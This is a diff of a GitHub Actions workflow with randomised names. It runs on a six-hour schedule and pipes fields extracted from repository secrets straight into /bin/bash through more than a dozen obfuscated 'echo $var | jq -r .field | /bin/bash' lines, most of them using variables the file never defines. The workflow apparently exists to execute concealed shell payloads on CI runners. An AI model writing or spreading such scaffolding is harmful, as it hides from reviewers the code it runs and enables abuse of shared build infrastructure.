@@ -2,24 +2,28 @@ name: hechenmo6745
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 3/6 * * *'
+    - cron: '18 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: hechenmo6745
         env:
-          bxoos1: ${{ secrets.bxoos1 }}
+          rkk17: ${{ secrets.rkk17 }}
         run: |
-          echo $bxoos1 | jq -r .zd5 | /bin/bash
-          echo $gytgt18591 | jq -r .mxwrj5 | /bin/bash
-          echo $njz8877 | jq -r .gu500 | /bin/bash
-          echo $wmd51750 | jq -r .oykug915 | /bin/bash
-          echo $mk0620 | jq -r .owmz57816 | /bin/bash
-          echo $nhd74132 | jq -r .eb29091 | /bin/bash
-          echo $lwt0 | jq -r .rhef0 | /bin/bash
-          echo $o883 | jq -r .uhr14 | /bin/bash
-          echo $wwi92938 | jq -r .w1 | /bin/bash
+          echo $rkk17 | jq -r .r914 | /bin/bash
+          echo $fs97708 | jq -r .f27 | /bin/bash
+          echo $kosh106 | jq -r .l5550 | /bin/bash
+          echo $uik81 | jq -r .ieu6 | /bin/bash
+          echo $mxyjs14 | jq -r .tb2962 | /bin/bash
+          echo $p2653 | jq -r .ktq0 | /bin/bash
+          echo $unzlc5875 | jq -r .o45 | /bin/bash
+          echo $a5432 | jq -r .pew30777 | /bin/bash
+          echo $vkpko556 | jq -r .bm8251 | /bin/bash
+          echo $n1 | jq -r .j42600 | /bin/bash
+          echo $h06398 | jq -r .m2864 | /bin/bash
+          echo $rr5 | jq -r .jcgd37 | /bin/bash
+          echo $etuah0 | jq -r .a0150 | /bin/bash
+          echo $jku3 | jq -r .iowha9026 | /bin/bash
 
